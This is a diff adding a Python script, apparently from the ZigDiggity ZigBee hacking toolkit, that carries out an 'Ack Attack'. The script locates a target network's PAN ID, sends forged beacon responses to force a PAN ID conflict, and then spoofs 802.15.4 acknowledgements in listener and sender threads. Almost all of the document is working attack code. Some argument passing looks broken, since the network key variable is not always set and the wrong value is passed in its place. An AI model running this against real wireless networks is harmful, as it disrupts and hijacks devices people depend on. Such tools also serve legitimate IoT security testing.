@@ -1,0 +1,231 @@
+#!/usr/bin/python
+
+from zigdiggity.interface.main import start_and_get_targets
+from zigdiggity.datastore import database_session
+from zigdiggity.datastore.networks import Network
+import zigdiggity.utils.packets as packets
+from zigdiggity.interface.colors import *
+from threading import Event
+import threading
+import signal
+import time
+from scapy.layers.dot15d4 import *
+from scapy.layers.zigbee import *
+
+DEBUG = 1
+
+def find_pan_using_epan(radio, epan, delay):
+    
+    packet = packets.beacon_request()
+    radio.send(packet)
+    send_time = time.time()
+
+    target_pan = None
+    while(time.time() < send_time + delay):
+        test_packet = radio.recv()
+        if not test_packet == None:
+            if ZigBeeBeacon in test_packet:
+                if test_packet[ZigBeeBeacon].extended_pan_id ==long(epan):
+                    target_pan = test_packet[Dot15d4Beacon].src_panid
+                    break
+
+    return target_pan
+
+def listen_for_packets(listener, target_pan, target_addr=None, network_key=None):
+    
+    reply_set = set()
+    temp_holder = {}
+    current = time.time()
+    none_count = 0
+    Color.pl("{+} Listener thread started")
+    while not stop_threads.isSet():
+        current=time.time()
+        test_packet = listener.recv()
+
+        # Skip None packets
+        if test_packet is None:
+            continue
+
+        if str(test_packet)[-2:] in reply_set:
+            continue
+
+        if Dot15d4Cmd in test_packet:
+            if (test_packet[Dot15d4Cmd].dest_panid == target_pan or test_packet[Dot15d4Cmd].src_panid == target_pan) and (target_addr is None or test_packet[Dot15d4Cmd].src_addr == target_addr) and (not test_packet[Dot15d4Cmd].dest_addr == 0xffff):
+                if test_packet[Dot15d4FCS].fcf_ackreq:
+                    threading.send_queue.append(("Ack", (test_packet[Dot15d4FCS].seqnum)))
+                    threading.send_queue.append(("Ack", (test_packet[Dot15d4FCS].seqnum)))
+                    reply_set.add(str(test_packet)[-2:])
+                    source = test_packet[Dot15d4FCS].src_addr
+                    threading.time_sent = time.time()
+
+                    # We want to send the APS ack after the Data request has been sent
+                    if source in temp_holder:
+                        threading.send_queue.append(temp_holder[source])
+                        temp_holder.pop(source, None)
+
+def send_acks(sender, network_key = None):
+
+    # Some data we'll need for later.
+    frame_counter = 10001
+    sequence_number_local = 10
+    last_seq_acked = -1
+    current = time.time()
+    pre_emptive_replies=100 # just more than our limit
+    last_reply_time_sent=0
+    last_pre_empt_sent=0
+    acks_sent = 0
+
+    Color.pl("{+} Sender thread started")
+    while not stop_threads.isSet():
+        if (acks_sent > 0):
+            Color.oneliner("{+} Acknowledges sent: %s " % acks_sent)
+        if len(threading.send_queue) > 10:
+            Color.pl("{!} Unacknowledged packets are building up. The sending thread is too slow.")
+        if (len(threading.send_queue) > 0):
+
+            sequence_number_local += 1
+            sequence_number_local = sequence_number_local % 256
+
+            # Check what to ack
+            ack_type, ack_args = threading.send_queue.pop(0)
+            if ack_type == "Ack":
+                sequence_number = ack_args
+                pre_emptive_replies=0
+                sender.send(packets.ack(sequence_number))
+                acks_sent +=1
+                last_reply_time_sent=time.time()
+                if (threading.time_sent > 0):
+                    # print "Took %s seconds to send the ack (seq:%s)" % ((time.time() - threading.time_sent), sequence_number)
+                    threading.time_sent = 0
+            elif ack_type == "APS Ack":
+                aps_args = ack_args[0]
+                nwk_args = ack_args[1]
+                d15d4_args = ack_args[2]
+                sender.send(packets.aps_ack(aps_counter=aps_args[0], aps_destination=aps_args[1], aps_source=aps_args[2], aps_cluster=aps_args[3], aps_profile=aps_args[4], frame_counter=frame_counter, nwk_seqnum=nwk_args[0], nwk_destination=nwk_args[1], nwk_source=nwk_args[2], d15d4_seqnum=sequence_number_local, d15d4_destination=d15d4_args[1], d15d4_source=d15d4_args[2], d15d4_pan=d15d4_args[3], key=network_key))
+                acks_sent +=1
+                frame_counter +=1
+        
+        # Because our network cards are slower than the devices, we need to start sending before we see a packet
+        # The tested devices used a 0.5 second interval, but this can be adjusted as needed
+        if pre_emptive_replies < 10 and last_reply_time_sent + 0.480 < time.time() and last_pre_empt_sent + 0.005 < time.time():
+            sender.send(packets.ack((sequence_number+1)%256))
+            acks_sent +=1
+            pre_emptive_replies += 1
+            last_pre_empt_sent = time.time()
+
+def handle_interrupt(signal, frame):
+    stop_threads.set()
+    Color.pl("")
+    Color.pl("{.} Receiver average time: %s ms" % (listener.avg_recv() * 1000))
+    Color.pl("{.} Sender average time: %s ms" % (sender.avg_send() * 1000))
+    time.sleep(1)
+    exit(1)
+
+if __name__ == '__main__':
+    init_info = start_and_get_targets(database_session)
+
+    sender = init_info['sender']
+    listener = init_info['listener']
+    target_type = init_info['target']['target_type']
+
+    if target_type == 'channel':        
+        Color.pl("{!} The Ack Attack is designed to be run against a network or device.")
+        Color.pl("{!} Please re-run and choose {G}Network {W}or {G}Device{W}.")
+        exit(1)
+    elif target_type == 'network':
+        network_target = init_info['target']['network']
+        channel = network_target.channel
+        target_epan = network_target.extended_pan_id
+        if target_epan is None:
+            
+            # need to find the epan to perform the network attack
+            target_pan = network_target.pan_id
+            if target_pan is None:
+                Color.pl("{!} Cannot target a network without a PAN or extended PAN.")
+                exit(1)
+            
+            network = database_session.query(Network).filter_by(pan_id=target_pan).first()
+            if not network is None:
+                target_epan = network.extended_pan_id
+                network_key = network.nwk_key
+            else:
+                Color.pl("{!} Cannot find the extended PAN associated with the target.")
+                exit(1)
+
+        else:
+            target_pan = network_target.pan_id
+        
+        target_addr = None
+
+    elif target_type == 'device':
+        device_target = init_info['target']['device']
+        channel = device_target.channel
+        target_epan = device_target.extended_pan_id
+        if target_epan is None:
+            
+            # need to find the epan to perform the device attack
+            target_pan = device_target.pan_id
+            if target_pan is None:
+                Color.pl("{!} Cannot target a network without a PAN or extended PAN.")
+                exit(1)
+            
+            network = database_session.query(Network).filter_by(pan_id=target_pan).first()
+            if not network is None:
+                target_epan = network.extended_pan_id
+                network_key = network.nwk_key
+            else:
+                Color.pl("{!} Cannot find the extended PAN associated with the target.")
+                exit(1)
+
+        else:
+            target_pan = device_target.pan_id
+        
+        target_addr = device_target.address
+
+    # Check to see if we know the network's network key.
+
+    listener.set_channel(channel)
+    sender.set_channel(channel)
+
+    Color.pl("{.} Locating the target's current PAN ID")
+
+    # Find the pan id of the target
+    for i in range(3):
+        target_pan = find_pan_using_epan(listener, target_epan, 5) # waits 5 seconds
+        if not target_pan is None:
+            break
+        time.sleep(0.5)
+
+    Color.pl("{+} Found target PAN ID: %s" % ("%x"%target_pan))
+    Color.pl("{.} Sending PAN conflict.")
+
+    # Push a pan id conflict
+    for i in range(6):
+        packet = packets.beacon_response(target_pan, seq_num=(i+1))
+        sender.send(packet)
+        time.sleep(0.05)
+
+    start_time = time.time()
+    threading.time_sent=0
+    threading.send_queue = []
+
+    global stop_threads 
+    stop_threads = Event()
+
+    listen_thread = threading.Thread(target=listen_for_packets, args=(listener, target_pan, target_addr))
+    send_thread = threading.Thread(target=send_acks, args=(sender, target_type))
+
+    listen_thread.daemon = True
+    send_thread.daemon = True
+
+    send_thread.start()
+    listen_thread.start()
+
+    signal.signal(signal.SIGINT, handle_interrupt)
+
+    while not stop_threads.isSet():
+        try:
+            send_thread.join(timeout=1)
+        except KeyboardInterrupt:
+            stop_threads.set() 
+
